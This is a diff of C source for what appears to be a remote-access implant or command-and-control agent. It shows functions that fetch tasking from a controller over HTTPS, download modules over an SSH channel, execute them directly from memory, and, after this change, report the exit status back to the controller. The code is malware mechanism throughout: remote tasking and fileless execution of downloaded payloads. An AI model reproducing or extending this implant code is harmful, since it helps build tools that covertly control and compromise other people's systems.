@@ -104,7 +104,7 @@ int exec_module(ssh_channel channel, char *module){
 	char buffr[128];
 	
 	memset(buffr, 0, sizeof(buffr));
-	sprintf(buffr, "10%s", module);
+	sprintf(buffr, "14%s", module);
 	
 	printf("Downloading module...\n");
 	
@@ -157,6 +157,10 @@ int exec_module(ssh_channel channel, char *module){
 
 	// execute file from memory
 	exit_status = do_exec(ptrFin, size);
+	memset(buffr, 0, sizeof(buffr));
+	sprintf(buffr, "%d", exit_status);
+
+	ssh_channel_write(channel, buffr, 2);
 	return 0;
 }
 #endif
@@ -287,7 +291,6 @@ int parse_tasking(char *tasking, ssh_channel chan){
 		i++;
 	}
 
-	int rc = 0;
 	for(int j = 0; j < num; j++){
 		switch(tasking_arr[j].operation)
 		{
@@ -307,7 +310,7 @@ int parse_tasking(char *tasking, ssh_channel chan){
 			break;
 		case AGENT_EXEC_MODULE:
 			printf("Got tasking to execute module %s\n", tasking_arr[j].opts);
-			rc = exec_module(chan, tasking_arr[j].opts);
+			exec_module(chan, tasking_arr[j].opts);
 			
 			break;
 
@@ -363,8 +366,7 @@ void get_tasking_https(){
     	res = curl_easy_perform(curl);
     	/* Check for errors */
     	if(res != CURLE_OK)
-      		fprintf(stderr, "curl_easy_perform() failed: %s\n",
-    				curl_easy_strerror(res));
+      		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
 
     	/* always cleanup */
     	curl_easy_cleanup(curl);
